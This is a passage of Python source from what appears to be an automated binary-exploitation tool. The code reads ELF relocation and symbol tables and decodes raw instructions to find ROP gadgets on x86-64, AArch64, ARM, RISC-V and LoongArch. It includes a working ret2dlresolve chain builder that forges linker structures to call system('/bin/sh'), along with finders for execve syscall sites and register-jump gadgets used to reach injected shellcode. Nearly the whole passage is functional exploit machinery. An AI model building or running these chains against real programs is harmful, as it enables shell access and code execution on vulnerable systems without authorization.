    """Every PLT GOT slot as {symbol_name: r_offset}, read from .rela.plt/.rel.plt. For a no-PIE
    target each r_offset is the absolute, writable address the PLT stub dereferences -- the set of
    arbitrary-write targets whose overwrite redirects a later call to that function. Pure stdlib,
    best-effort: {} when the reloc/symbol tables are absent."""
    secs = _sections(data)
    rela = secs.get(".rela.plt") or secs.get(".rel.plt")
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not rela or not ds or not st:
        return {}
    is64, endc = _elf_class_endian(data)
    rel_ent = rela[2] or (24 if is64 else 8)
    sym_ent = ds[2] or (24 if is64 else 16)
    stroff = st[0]

    def _symname(idx):
        try:
            st_name = struct.unpack_from(endc + "I", data, ds[0] + idx * sym_ent)[0]
            end = data.find(b"\x00", stroff + st_name)
            return data[stroff + st_name:end].decode("latin-1", "replace")
        except struct.error:
            return ""

    out: dict = {}
    for o in range(rela[0], rela[0] + rela[1], rel_ent):
        try:
            if is64:
                r_offset, r_info = struct.unpack_from(endc + "QQ", data, o)[:2]
                sym = r_info >> 32
            else:
                r_offset, r_info = struct.unpack_from(endc + "II", data, o)[:2]
                sym = r_info >> 8
        except struct.error:
            break
        name = _symname(sym)
        if name:
            out[name] = r_offset
    return out


def section_addr(data: bytes, name: str):
    """The runtime VADDR (sh_addr) of section `name`, or None. For a no-PIE target this is the
    fixed address of .rela.plt / .dynsym / .dynstr / .plt that a ret2dlresolve forges against."""
    try:
        is64, endc = _elf_class_endian(data)
        if is64:
            e_shoff = struct.unpack_from(endc + "Q", data, 0x28)[0]
            she, shn, shx = struct.unpack_from(endc + "HHH", data, 0x3A)
            fmt = endc + "IIQQQQIIQQ"
        else:
            e_shoff = struct.unpack_from(endc + "I", data, 0x20)[0]
            she, shn, shx = struct.unpack_from(endc + "HHH", data, 0x2E)
            fmt = endc + "IIIIIIIIII"
        shs = [struct.unpack_from(fmt, data, e_shoff + i * she) for i in range(shn)]
        so = shs[shx][4]
        for sh in shs:
            end = data.find(b"\x00", so + sh[0])
            if data[so + sh[0]:end].decode("latin-1", "replace") == name and sh[3]:
                return sh[3]                            # sh_addr
    except Exception:
        observe.absorbed(_log, "continuing")
    return None


def has_bind_now(data: bytes) -> bool:
    """True if the target binds EAGERLY (full RELRO: DT_BIND_NOW / DF_BIND_NOW / DF_1_NOW). Lazy
    PLT resolution is then off, so ret2dlresolve does not apply -- the resolver is never reached
    through the PLT. Feasibility is a property of the TARGET binary, not the host's glibc, so this
    stays correct when the exploit later runs against a different (e.g. older) loader."""
    secs = _sections(data)
    dyn = secs.get(".dynamic")
    if not dyn:
        return False
    is64, endc = _elf_class_endian(data)
    off, size = dyn[0], dyn[1]
    ent = 16 if is64 else 8
    tagfmt = endc + ("qQ" if is64 else "iI")
    DT_BIND_NOW, DT_FLAGS, DT_FLAGS_1 = 24, 30, 0x6ffffffb
    for o in range(off, off + size, ent):
        try:
            tag, val = struct.unpack_from(tagfmt, data, o)
        except struct.error:
            break
        if tag == 0:                                   # DT_NULL: end of .dynamic
            break
        if tag == DT_BIND_NOW:
            return True
        if tag == DT_FLAGS and (val & 0x8):            # DF_BIND_NOW
            return True
        if tag == DT_FLAGS_1 and (val & 0x1):          # DF_1_NOW
            return True
    return False


def build_ret2dlresolve(offset, *, read_plt, plt0, pop_rdi, pop_rsi, pop_rdx, ret_gadget,
                        jmprel, symtab, strtab, scratch, symbol=b"system", arg=b"/bin/sh",
                        align=False):
    """A leak-free ret2libc via the dynamic linker. Forge, in writable `scratch`, an Elf64_Rela +
    Elf64_Sym + the symbol string so that _dl_runtime_resolve resolves `symbol` (e.g. "system")
    and immediately calls it with rdi = &arg -- no libc leak, no `system` PLT entry needed. Works
    on ANY loader that still binds this target lazily (older glibc included; that is the common
    offline case), because everything forged comes from the TARGET binary's own tables.

    Returns (chain, data): the stage-1 ROP `chain` reads `data` into `scratch` via
    read(0, scratch, n), sets rdi = &arg, then drops into PLT0 with the forged reloc index.
    `align=True` inserts one `ret` for the 16-byte-aligned rsp system()/do_system needs -- the
    re-entered frame's parity is environment-dependent, so the caller detonates BOTH ways.
    """
    def q(v):
        return struct.pack("<Q", v & (2**64 - 1))

    def _aligned(a, base):                             # advance a to the next 24-byte grid vs base
        while (a - base) % 24:
            a += 1
        return a

    gotslot = scratch                                  # 8-byte slot the resolver writes into; kept
    sym_a = _aligned(scratch + 8, symtab)              # BEFORE the structures so its write can't
    rela_a = _aligned(sym_a + 24, jmprel)              # clobber the Sym/Rela or the arg string
    str_a = rela_a + 24                                # the symbol name string
    arg_a = str_a + len(symbol) + 1                    # the argument string (e.g. "/bin/sh")
    sym_index = (sym_a - symtab) // 24
    reloc_index = (rela_a - jmprel) // 24
    n = (arg_a + len(arg) + 1) - scratch

    data = bytearray(n)
    data[sym_a - scratch:sym_a - scratch + 24] = struct.pack(
        "<IBBHQQ", str_a - strtab, 0x12, 0, 0, 0, 0)   # st_name, st_info=STB_GLOBAL|STT_FUNC
    data[rela_a - scratch:rela_a - scratch + 24] = struct.pack(
        "<QQq", gotslot, (sym_index << 32) | 7, 0)     # r_offset, r_info=(sym<<32)|JMP_SLOT(7)
    data[str_a - scratch:str_a - scratch + len(symbol) + 1] = symbol + b"\x00"
    data[arg_a - scratch:arg_a - scratch + len(arg) + 1] = arg + b"\x00"

    chain = (b"A" * offset
             + q(pop_rdi) + q(0) + q(pop_rsi) + q(scratch) + q(pop_rdx) + q(n) + q(read_plt)
             + q(pop_rdi) + q(arg_a)
             + (q(ret_gadget) if align else b"")
             + q(plt0) + q(reloc_index))
    return bytes(chain), bytes(data)


def _jcc_at(seg, p):
    """True if seg[p:] begins an equality conditional jump: short jz/jnz (74/75) or the near
    two-byte forms (0f 84 / 0f 85). Compilers pick either depending on the branch distance."""
    if p < len(seg) and seg[p] in (0x74, 0x75):
        return True
    return p + 1 < len(seg) and seg[p] == 0x0F and seg[p + 1] in (0x84, 0x85)


def _s8(b):
    return b - 256 if b >= 128 else b


_MOVABS = re.compile(rb"[\x48\x49][\xb8-\xbf]")


def _find_movabs(seg, start):
    """Index of the next `movabs r64, imm64` (REX.W prefix 0x48/0x49, opcode 0xB8..0xBF) at or
    after `start`, or -1. This is the only x86-64 instruction carrying a full 64-bit immediate."""
    m = _MOVABS.search(seg, max(0, start))             # C-speed scan: a byte loop took seconds
    return m.start() if m else -1                      # on a large binary's code segment


def _local_load_disp(seg, lo, hi):
    """Signed rbp/rsp disp8 of a `mov r64, [rbp/rsp+disp8]` load in seg[lo:hi], or None. Used to
    recover the checked local's frame displacement for the 64-bit magic-gate shape."""
    for x in range(max(0, lo), min(hi, len(seg) - 3)):
        if seg[x] != 0x48 or seg[x + 1] != 0x8B:         # REX.W mov r64, r/m64
            continue
        modrm = seg[x + 2]
        if (modrm & 0xC7) == 0x45:                       # mod=01, rm=101 -> [rbp+disp8]
            return _s8(seg[x + 3])
        if (modrm & 0xC7) == 0x44 and x + 4 < len(seg) and seg[x + 3] == 0x24:  # [rsp+disp8]
            return _s8(seg[x + 4])
    return None


def find_br_gadgets_aarch64(data: bytes):
    """AArch64 `br <Xn>` / `blr <Xn>` gadgets, as [{insn, reg, va}] (reg 'x0'..'x30'). These branch
    the PC to a register's value -- the aarch64 equivalent of x86 `jmp <reg>`, and the only no-leak
    way to reach injected shellcode on the (ASLR'd) stack when a register points at the input
    buffer. Encodings: br Xn = 0xD61F0000 | (n<<5); blr Xn = 0xD63F0000 | (n<<5)."""
    out = []
    for insn, base in (("br", 0xD61F0000), ("blr", 0xD63F0000)):
        for n in range(31):                              # x0..x30 (x31 is xzr/sp, not a br target)
            va = _find_exec(data, struct.pack("<I", base | (n << 5)), 4)
            if va is not None:
                out.append({"insn": insn, "reg": f"x{n}", "va": va})
    out.sort(key=lambda g: (int(g["reg"][1:]), g["insn"]))
    return out


def _a64_is_branch(w: int) -> bool:
    """True if `w` is any AArch64 branch -- b/bl (imm), b.cond, cbz/cbnz, tbz/tbnz, br/blr/ret. A
    loader whose body BRANCHES between its arg-pop and its `ldp x29,x30` epilogue is not a reliable
    ROP gadget: the branch can skip the epilogue (e.g. `cmp x1,x0; b.ne` -- measured on a real
    `ldp x0,x1` loader whose b.ne fired whenever x0!=x1 and threw the chain off the epilogue), so it
    only chains for specific register values. The clean-body loaders are the chainable ones."""
    return ((w & 0xFC000000) == 0x14000000                       # b
            or (w & 0xFC000000) == 0x94000000                    # bl
            or (w & 0xFF000000) == 0x54000000                    # b.cond
            or (w & 0x7E000000) == 0x34000000                    # cbz/cbnz
            or (w & 0x7E000000) == 0x36000000                    # tbz/tbnz
            or (w & 0xFFFFFC1F) == 0xD61F0000                    # br
            or (w & 0xFFFFFC1F) == 0xD63F0000)                   # blr


def _a64_body_hazard(w: int, loaded: tuple) -> bool:
    """True if body instruction `w` would wreck a loader chain that popped the registers in
    `loaded`: a BRANCH (may skip the epilogue), a STORE (writes memory at a register that is
    attacker-uncontrolled or is the just-loaded &"/bin/sh" -- `stp xzr,xzr,[x0]` on a read-only
    string SIGSEGVs, measured on a real `ldp x0,x2` loader), or any write to a loaded register
    (`mov w0,#0` after `ldp x0,x2` zeroes the argument -- also measured). Catching these is why the
    `ldp x0,*` gadgets this libc has are NOT usable for a 3-register execve chain even though they
    decode as loaders: the one-arg ret2libc never hit it because its loader bodies are simple
    restores, but a store/clobber body is common and must be rejected."""
    if _a64_is_branch(w):
        return True
    # STORE families (bit 22 == 0 is a store for the load/store opcodes): STR/STUR imm, STP.
    if (w & 0x3B000000) == 0x39000000 and not (w & 0x00400000):   # STR/STUR (unsigned/unscaled) imm
        return True
    if (w & 0x7FC00000) in (0x29000000, 0x28000000, 0x29800000):  # STP (no writeback / pre / post)
        return True
    # A data-processing / move whose DESTINATION is one of the loaded regs clobbers the argument.
    # Loads (bit 27..) are excluded -- the loader's own ldp is handled by the caller; here we only
    # see body instructions, and a move/ALU op to x0/x1/x2 (Rd = bits 4:0) undoes the pop.
    if (w & 0x1F) in loaded and ((w & 0x7F000000) == 0x52000000      # movz/movn/movk (wide imm)
                                 or (w & 0x7F000000) == 0x2A000000    # orr/mov (reg)
                                 or (w & 0x7F000000) == 0x0B000000    # add (reg)
                                 or (w & 0x7F000000) == 0x11000000):  # add (imm)
        return True
    return False


_A64_RET = 0xD65F03C0                                    # ret (x30)
_A64_NOPS = {0xD503201F, 0xD50323BF, 0xD50323FF,         # nop, autiasp, autibsp
             0xD503235F, 0xD503239F}                     # autiaz, autibz (auth = nop under qemu)


def _a64_words(data: bytes):
    """(va, word) for every 4-byte instruction in executable segments (little-endian aarch64)."""
    for off, sz, va, flags in _loads(data):
        if not (flags & 1):
            continue
        for p in range(off, off + (sz & ~3) - 3, 4):
            yield va + (p - off), int.from_bytes(data[p:p + 4], "little")


_A64_LDP_SIGNED = 0xA9400000                             # LDP Xt,Xt2,[Xn,#imm]   (no writeback)
_A64_LDP_POSTIDX = 0xA8C00000                            # LDP Xt,Xt2,[Xn],#imm   (post-index)


def _a64_ldp_regs(w: int):
    """(Rt, Rt2, Rn) if `w` is a 64-bit LDP (post-index / signed-offset / pre-index), else None."""
    if (w & 0xFFC00000) in (0xA8C00000, 0xA9400000, 0xA9C00000):
        return w & 0x1F, (w >> 10) & 0x1F, (w >> 5) & 0x1F
    return None


def _a64_ldp_imm(w: int) -> int:
    """The signed byte displacement of a 64-bit LDP (imm7 field, scaled by 8)."""
    imm7 = (w >> 15) & 0x7F
    if imm7 & 0x40:
        imm7 -= 0x80
    return imm7 * 8


def find_aarch64_r2libc_gadgets(data: bytes) -> dict:
    """AArch64 two-gadget ret2libc gadgets, decoded straight from the bytes (no objdump -- the host
    objdump cannot disassemble aarch64, so this is pure-stdlib like `find_br_gadgets_aarch64`):

      caller: `mov x0, xS ; blr xB`  -- set x0 from a callee-saved reg, then call another one.
      loader: `ldp xR1, xR2, [sp,..] ; ... ; ldp x29, x30, [sp], #M ; (auti*;) ret` -- pop two
              callee-saved regs AND the return address off the stack, then return.

    Chaining a loader whose {R1,R2} == a caller's {S,B} gives system("/bin/sh"): the loader sets
    xS=&"/bin/sh", xB=&system and x30=caller; the caller does x0=xS; blr xB. Returns
    {"callers":[{va,src,br}], "loaders":[{va,r1,r2,a_off}]} (reg indices; a_off = the first ldp's
    [sp,#A] displacement, so the chain can place xR1 at sp+a_off and xR2 at sp+a_off+8, while x29/x30
    land at sp+0/+8 from the post-indexed restore). Pointer-authentication
    (`autiasp`) is a no-op under qemu-user, so those epilogues are usable gadgets."""
    words = list(_a64_words(data))
    callers, loaders = [], []
    for i in range(len(words) - 1):
        va, w = words[i]
        if (w & 0xFFE0FFFF) == 0xAA0003E0:               # mov x0, xS  (orr x0, xzr, xS)
            s = (w >> 16) & 0x1F
            w2 = words[i + 1][1]
            if (w2 & 0xFFFFFC1F) == 0xD63F0000 and s < 29:   # blr xB
                callers.append({"va": va, "src": s, "br": (w2 >> 5) & 0x1F})
    for i in range(len(words)):
        va, w = words[i]
        regs = _a64_ldp_regs(w)
        if not regs:
            continue
        r1, r2, rn = regs
        if rn != 31 or r1 in (29, 30, 31) or r2 in (29, 30, 31):
            continue                                     # must load two GPRs from sp
        # The first ldp must be the signed-offset form `ldp xR1,xR2,[sp,#A]` (no writeback): sp is
        # unchanged until the final post-indexed restore, so every popped word sits at a fixed offset
        # from the loader's entry sp -- xR1 at +A, xR2 at +A+8, x29 at +0, x30 at +8. A writeback form
        # (pre/post-index) would move sp mid-gadget and break that fixed layout, so skip it: the
        # chain-builder relies on a_off to place &system / &"/bin/sh" exactly.
        if (w & 0xFFC00000) != _A64_LDP_SIGNED:
            continue
        a_off = _a64_ldp_imm(w)
        if a_off < 0:                                    # words must land in the forward overflow
            continue
        body_clean = True                                # no branch between the arg-pop and epilogue
        for k in range(i + 1, min(i + 8, len(words))):
            wk = words[k][1]
            if wk in _A64_NOPS:
                continue
            lr = _a64_ldp_regs(wk)
            if (lr and lr[0] == 29 and lr[1] == 30 and lr[2] == 31      # ldp x29, x30, [sp], #M
                    and (wk & 0xFFC00000) == _A64_LDP_POSTIDX):         # post-index: x29@sp+0, x30@+8
                for j in range(k + 1, min(k + 4, len(words))):
                    wj = words[j][1]
                    if wj in _A64_NOPS:
                        continue
                    if wj == _A64_RET:
                        # m_off = the post-indexed `ldp x29,x30,[sp],#M` displacement: how far sp
                        # advances past this loader, hence where a CHAINED next gadget's frame
                        # begins (its entry sp = this loader's entry sp + M). ret2libc ignores it
                        # (one loader, then a caller that pops nothing); the execve-syscall chain
                        # needs it to stack a second loader. `clean` = the body between the arg-pop
                        # and the epilogue does not BRANCH, so the epilogue is always reached (a
                        # branching body, e.g. `cmp x1,x0; b.ne`, only chains for specific values).
                        loaders.append({"va": va, "r1": r1, "r2": r2, "a_off": a_off,
                                        "m_off": _a64_ldp_imm(wk), "clean": body_clean})
                    break
                break
            if lr and (lr[0] in (r1, r2) or lr[1] in (r1, r2)):
                break                                    # r1/r2 clobbered before the restore
            if _a64_body_hazard(wk, (r1, r2)):
                body_clean = False                       # branch / store / clobber in the body
    return {"callers": callers, "loaders": loaders}


@lru_cache(maxsize=64)
def find_aarch64_execve_site(data: bytes):
    """The address of a `mov x8, #221 ; svc #0` sequence -- libc's execve syscall site. Reaching it
    with x0=&"/bin/sh", x1=0, x2=0 is execve("/bin/sh", NULL, NULL): a cross-arch L3 that needs no
    `system` symbol in the image, unlike ret2libc. 221 is the aarch64 execve syscall number; jumping
    to the `movz` sets x8 and the following `svc` makes the call with x0/x1/x2 as set by the chain.
    Returns the va of the `movz x8,#221`, or None. Pure byte decode (no aarch64 objdump on the host).

    Any `svc #0` preceded by a `movz x8,#221` qualifies; the common site is libc's own execve
    thunk. (A bare `svc` reached with x8 already 221 would also work, but then x8 has to be set by a
    gadget, which the arg-register scarcity makes unreliable -- the movz+svc pair sets it for us.)"""
    MOVZ_X8_221 = 0xD2800008 | (221 << 5)
    SVC0 = 0xD4000001
    prev = None                                          # (va, word) of the preceding instruction
    for va, w in _a64_words(data):
        if w == SVC0 and prev is not None and prev[0] == va - 4 and prev[1] == MOVZ_X8_221:
            return prev[0]                               # jump to the movz, not the svc
        prev = (va, w)
    return None


def find_riscv64_execve_site(data: bytes):
    """The address of a `li a7, 221 ; ecall` sequence -- libc's RISC-V 64 execve syscall site, the
    riscv analogue of `find_aarch64_execve_site`. Reaching it with a0=&"/bin/sh", a1=0, a2=0 is
    execve("/bin/sh", NULL, NULL): the no-`system` L3 route. 221 is the riscv64 execve syscall number;
    jumping to the `li a7,221` sets a7 and the following `ecall` makes the call with a0/a1/a2 as set by
    the chain. Returns the va of the `li a7,221`, or None. Pure byte decode (no riscv objdump here).

    `li a7,221` is `addi a7,x0,221` = 0x0DD00893 (221 fits a 12-bit immediate, so there is no `lui`
    pair), `ecall` is 0x00000073; both are 4-byte even under RVC, and the pair is contiguous in libc's
    execve thunk. Searched at 2-byte alignment because preceding compressed code can place the `addi`
    on a 2-byte boundary. (As on aarch64, a bare `ecall` reached with a7 already 221 would also work,
    but the a7 would then need a gadget; the li+ecall pair sets it for us.)"""
    pat = bytes((0x93, 0x08, 0xD0, 0x0D, 0x73, 0x00, 0x00, 0x00))   # addi a7,x0,221 ; ecall (LE)
    return _find_exec(data, pat, align=2)


def find_arm_r0pc_gadgets(data: bytes):
    """ARM (32-bit, ARM mode) `pop {r0, ..., pc}` gadgets -- LDMFD sp!, {rlist} with both r0 and pc
    in the list. LDM loads in register-number order from low memory, so r0 (lowest) comes off [sp]
    and pc (r15, highest) off the last slot: one gadget sets the first argument AND the return PC,
    the ARM32 ret2libc primitive (r0=&"/bin/sh", pc=&system). Returns [{va, nregs}] sorted by fewest
    popped words (cleanest stack layout first). Encoding: pop {rlist} = 0xE8BD0000 | rlist;
    r0=bit0, pc=bit15. Pure byte decode (the host objdump cannot disassemble ARM)."""
    out = []
    for va, w in _a64_words(data):                       # 4-byte little-endian words (reused)
        if (w & 0xFFFF0000) == 0xE8BD0000 and (w & 0x8001) == 0x8001:
            out.append({"va": va, "nregs": bin(w & 0xFFFF).count("1")})
    out.sort(key=lambda g: g["nregs"])
    return out


def find_bx_gadgets_arm(data: bytes):
    """ARM (32-bit, ARM mode) `bx <Rn>` / `blx <Rn>` gadgets, as [{insn, reg, va}] (reg r0..r14).
    The ARM `jmp <reg>` -- branch (with optional link) to a register's value -- the only no-leak way
    to reach injected ARM-mode shellcode on the ASLR'd stack when a register points at the buffer.
    Encodings: bx Rn = 0xE12FFF10 | n; blx Rn = 0xE12FFF30 | n."""
    out = []
    for insn, base in (("bx", 0xE12FFF10), ("blx", 0xE12FFF30)):
        for n in range(15):                              # r0..r14 (r15 is pc, not a bx source here)
            va = _find_exec(data, struct.pack("<I", base | n), 4)
            if va is not None:
                out.append({"insn": insn, "reg": f"r{n}", "va": va})
    out.sort(key=lambda g: (int(g["reg"][1:]), g["insn"]))
    return out


# ---------------------------------------------------------------- RISC-V 64 ret2libc gadgets
# s-registers (callee-saved): s0=x8, s1=x9, s2..s11 = x18..x27. These are what a function epilogue
# restores from the stack, so they are the registers a ROP chain can control.
_RV_SREG = {8, 9} | set(range(18, 28))


def _rv_decode(w: int, sz: int):
    """Decode the handful of RISC-V insns a ret2libc chain cares about, for a 2-byte compressed or
    4-byte base word. Returns (op, reg, imm): op in {mv, jr, jalr, ret, ldsp, addisp, nop} or None.
    `reg` is rd for a load / the source for mv-jr; `imm` is the sp-relative byte offset for a load or
    the sp adjustment for addisp. A static RISC-V binary pulls in compressed (RVC) libc regardless of
    the main module's -march, so both widths must be handled; host objdump cannot disassemble it."""
    if sz == 2:
        if (w & 0xF003) == 0x8002:                       # C.MV / C.JR / C.EBREAK family (funct4=1000)
            rd, rs2 = (w >> 7) & 0x1F, (w >> 2) & 0x1F
            if rs2 and rd:
                return ("mv", rd, rs2)                    # c.mv rd, rs2
            if rs2 == 0 and rd == 1:
                return ("ret", 1, 0)                      # c.jr ra == ret
            if rs2 == 0 and rd:
                return ("jr", rd, 0)                      # c.jr rd
        if (w & 0xF003) == 0x9002:                        # C.JALR / C.ADD family (funct4=1001)
            rd, rs2 = (w >> 7) & 0x1F, (w >> 2) & 0x1F
            if rs2 == 0 and rd:
                return ("jalr", rd, 0)                    # c.jalr rd  (rd!=0; rd==0 is c.ebreak)
        if (w & 0xE003) == 0x6002 and ((w >> 7) & 0x1F):  # c.ldsp rd, uimm(sp)
            imm = (((w >> 12) & 1) << 5) | (((w >> 5) & 3) << 3) | (((w >> 2) & 7) << 6)
            return ("ldsp", (w >> 7) & 0x1F, imm)
        if (w & 0xEF83) == 0x6101:                        # c.addi16sp sp, nzimm
            u = ((((w >> 12) & 1) << 9) | (((w >> 3) & 3) << 7) | (((w >> 5) & 1) << 6)
                 | (((w >> 2) & 1) << 5) | (((w >> 6) & 1) << 4))
            return ("addisp", 2, u - 0x400 if u & 0x200 else u)
        if w == 0x0001:
            return ("nop", 0, 0)
        return None
    if (w & 0x707F) == 0x3003 and ((w >> 15) & 0x1F) == 2:    # ld rd, off(sp)
        off = (w >> 20) & 0xFFF
        return ("ldsp", (w >> 7) & 0x1F, off - 0x1000 if off & 0x800 else off)
    if (w & 0x707F) == 0x0067:                               # jalr rd, rs1, imm
        rd, rs1, imm = (w >> 7) & 0x1F, (w >> 15) & 0x1F, (w >> 20) & 0xFFF
        if rd == 0 and rs1 == 1 and imm == 0:
            return ("ret", 1, 0)
        if imm == 0:                                         # only a displacement-free jalr is a
            return ("jalr" if rd == 1 else "jr", rs1, 0)     # clean register jump; jalr sB,off(sB)
        return None                                          # lands at sB+off, not sB -- not a gadget
    if (w & 0x707F) == 0x0013 and ((w >> 7) & 0x1F) == 2 and ((w >> 15) & 0x1F) == 2:   # addi sp,sp,imm
        off = (w >> 20) & 0xFFF
        return ("addisp", 2, off - 0x1000 if off & 0x800 else off)
    return None


def _rv_stream(data: bytes):
    """Linear decode of every executable byte as a RISC-V instruction stream: [(va, op, reg, imm)].
    Compressed (2-byte, low bits != 11) and base (4-byte) insns are length-decoded in sequence."""
    out = []
    for off, sz, va, flags in _loads(data):
        if not (flags & 1):
            continue
        p, end = off, off + sz
        while p + 2 <= end:
            w16 = int.from_bytes(data[p:p + 2], "little")
            if (w16 & 3) != 3:
                rec = _rv_decode(w16, 2)
                out.append((va + (p - off), rec)); p += 2
            else:
                if p + 4 > end:
                    break
                rec = _rv_decode(int.from_bytes(data[p:p + 4], "little"), 4)
                out.append((va + (p - off), rec)); p += 4
    return out


def find_riscv64_r2libc_gadgets(data: bytes) -> dict:
    """RISC-V 64 two-gadget ret2libc gadgets (pure byte decode; host objdump cannot disassemble it):

      caller: `mv a0, sS ; (jr|jalr) sB`  -- set the first argument a0 from a callee-saved reg, then
              jump to another one.
      loader: a contiguous function epilogue `ld sX,oX(sp); ... ; ld ra,oRA(sp); addi sp,sp,N; ret`
              that restores two callee-saved regs AND the return address off the attacker stack.

    Chaining a loader that restores {S,B} with a caller whose {src,br}=={S,B} gives system("/bin/sh"):
    the loader sets sS=&"/bin/sh", sB=&system and ra=caller; the caller does a0=sS; jr sB. Returns
    {"callers":[{va,src,br}], "loaders":[{va,regs:{reg:off},raoff,spadj}]} (reg = x-number). Only an
    epilogue of load/addi-sp/mv/nop before the ret is taken, so `regs`/offsets are exact."""
    s = _rv_stream(data)
    callers, loaders = [], []
    for i in range(len(s) - 1):
        va, rec = s[i]
        if rec and rec[0] == "mv" and rec[1] == 10 and rec[2] in _RV_SREG:
            nrec = s[i + 1][1]
            if nrec and nrec[0] in ("jr", "jalr") and nrec[1] in _RV_SREG:
                callers.append({"va": va, "src": rec[2], "br": nrec[1]})
    for i, (va, rec) in enumerate(s):
        if not (rec and rec[0] == "ret"):
            continue
        regs, raoff, spadj, entry, j = {}, None, 0, va, i - 1
        while j >= 0:                                    # walk back over the contiguous epilogue
            o = s[j][1]
            if not o or o[0] not in ("ldsp", "addisp", "mv", "nop"):
                break
            if o[0] == "ldsp":
                if o[1] == 1:
                    raoff = o[2]
                elif o[1] in _RV_SREG:
                    regs[o[1]] = o[2]
            elif o[0] == "addisp":
                spadj = o[2]
            entry = s[j][0]
            j -= 1
        if raoff is not None and len(regs) >= 2:
            loaders.append({"va": entry, "regs": regs, "raoff": raoff, "spadj": spadj})
    return {"callers": callers, "loaders": loaders}


def find_jr_gadgets_riscv64(data: bytes):
    """RISC-V 64 `jr <rN>` / `jalr <rN>` gadgets as [{insn, reg, va}] -- the RISC-V `jmp <reg>`, the
    no-leak way to reach injected shellcode on an execstack when a register points at the input
    buffer. Base (4-byte) encodings only, to avoid matching inside a wider instruction: jr rN =
    jalr x0,rN,0 (0x67 | rN<<15); jalr rN = jalr ra,rN,0 (0xe7 | rN<<15)."""
    out = []
    for n in range(1, 32):                               # x1..x31 (x0 holds no address)
        for insn, enc in (("jr", 0x00000067 | (n << 15)), ("jalr", 0x000000E7 | (n << 15))):
            va = _find_exec(data, enc.to_bytes(4, "little"), 2)
            if va is not None:
                out.append({"insn": insn, "reg": f"x{n}", "va": va})
    return out


# ---------------------------------------------------------------- LoongArch64 ret2libc gadgets
# LoongArch callee-saved GPRs are r22 (fp/s9) and r23..r31 (s0..s8) -- the registers a function
# epilogue restores from its frame, hence the ones a stack overflow of that frame can control.
_LA_SREG = set(range(22, 32))


def _la_decode(w: int):
    """Decode the LoongArch (LA64) instructions a ret2libc chain cares about, from one 32-bit word.
    Returns (op, a, b): op in {move, jr, jalr, ret, ldsp, addisp, nop} or None. For `move` a=rd, b=rj;
    for jr/jalr/ret a=the branch-target register; for ldsp a=rd, b=the sp-relative byte offset; for
    addisp a=3 (sp), b=the sp adjustment. Fixed 4-byte little-endian encoding; host objdump cannot
    disassemble LoongArch. Opcode widths differ per format and are prefix-free, so each test reads its
    own field: `or` is 3R (op[31:15]=0x2A), `jirl` is 1RI16 (op[31:26]=0x13), `ld.d`/`addi.d` are
    2RI12 (op[31:22]=0x0A3 / 0x00B). Encodings verified against binutils gas/objdump."""
    rd, rj, rk = w & 0x1F, (w >> 5) & 0x1F, (w >> 10) & 0x1F
    if (w >> 15) == 0x2A:                                # or rd, rj, rk
        return ("move", rd, rj) if rk == 0 else None     # or with $zero == move
    if (w >> 26) == 0x13:                                # jirl rd, rj, offs16
        if ((w >> 10) & 0xFFFF) != 0:
            return None                                  # only a displacement-free jirl is a clean jump
        if rd == 0 and rj == 1:
            return ("ret", 1, 0)                         # jirl $zero, $ra == ret
        if rd == 0:
            return ("jr", rj, 0)                         # jirl $zero, rj
        if rd == 1:
            return ("jalr", rj, 0)                       # jirl $ra, rj
        return None
    si12 = (w >> 10) & 0xFFF
    si12 = si12 - 0x1000 if si12 & 0x800 else si12
    if (w >> 22) == 0x0A3 and rj == 3:                   # ld.d rd, $sp, si12
        return ("ldsp", rd, si12)
    if (w >> 22) == 0x00B and rd == 3 and rj == 3:       # addi.d $sp, $sp, si12
        return ("addisp", 3, si12)
    if w == 0x03400000:                                  # andi $zero, $zero, 0 == nop
        return ("nop", 0, 0)
    return None


def _la_stream(data: bytes):
    """Linear decode of every executable byte as a LoongArch instruction stream: [(va, rec)]."""
    out = []
    for off, sz, va, flags in _loads(data):
        if not (flags & 1):
            continue
        p, end = off, off + sz
        while p + 4 <= end:
            out.append((va + (p - off), _la_decode(int.from_bytes(data[p:p + 4], "little"))))
            p += 4
    return out


def find_loongarch64_r2libc_gadgets(data: bytes) -> dict:
    """LoongArch64 two-gadget ret2libc gadgets (pure byte decode; host objdump cannot disassemble it):

      caller: `move $a0, $sS ; (jr|jalr) $sB`  -- set the first argument a0 from a callee-saved reg,
              then jump to another callee-saved one.
      loader: a contiguous function epilogue `ld.d $sX,oX($sp); ... ; ld.d $ra,oRA($sp); addi.d
              $sp,$sp,N; jr $ra` that restores two callee-saved regs AND the return address off the
              attacker stack.

    Chaining a loader that restores {S,B} with a caller whose {src,br}=={S,B} gives system("/bin/sh"):
    the loader sets $sS=&"/bin/sh", $sB=&system and $ra=caller; the caller does $a0=$sS; jr $sB.
    Returns {"callers":[{va,src,br}], "loaders":[{va,regs:{reg:off},raoff,spadj}]} (reg = GPR number).
    Only an epilogue of ld.d/addi.d-sp/move/nop before the ret is taken, so `regs`/offsets are exact.
    Mirrors the RISC-V finder; the structure is identical, only the instruction decode differs."""
    s = _la_stream(data)
    callers, loaders = [], []
    for i in range(len(s) - 1):
        va, rec = s[i]
        if rec and rec[0] == "move" and rec[1] == 4 and rec[2] in _LA_SREG:   # move $a0, $sS
            nrec = s[i + 1][1]
            if nrec and nrec[0] in ("jr", "jalr") and nrec[1] in _LA_SREG:
                callers.append({"va": va, "src": rec[2], "br": nrec[1]})
    for i, (va, rec) in enumerate(s):
        if not (rec and rec[0] == "ret"):
            continue
        regs, raoff, spadj, entry, j = {}, None, 0, va, i - 1
        while j >= 0:                                    # walk back over the contiguous epilogue
            o = s[j][1]
            if not o or o[0] not in ("ldsp", "addisp", "move", "nop"):
                break
            if o[0] == "ldsp":
                if o[1] == 1:
                    raoff = o[2]
                elif o[1] in _LA_SREG:
                    regs[o[1]] = o[2]
            elif o[0] == "addisp":
                spadj = o[2]
            entry = s[j][0]
            j -= 1
        if raoff is not None and len(regs) >= 2:
            loaders.append({"va": entry, "regs": regs, "raoff": raoff, "spadj": spadj})
    return {"callers": callers, "loaders": loaders}


def find_br_gadgets_loongarch64(data: bytes):
    """LoongArch64 `jr <rN>` gadgets as [{insn, reg, va}] -- the LoongArch `jmp <reg>`
    (`jirl $zero, $rN, 0`), the no-leak way to reach injected shellcode on an execstack when a
    register points at the input buffer. 4-byte aligned (fixed-width ISA). jr rN = jirl zero,rN,0 =
    0x4C000000 | (rN << 5); r0 is the zero register, so it holds no address and is skipped."""
    out = []
    for n in range(1, 32):
        enc = 0x4C000000 | (n << 5)
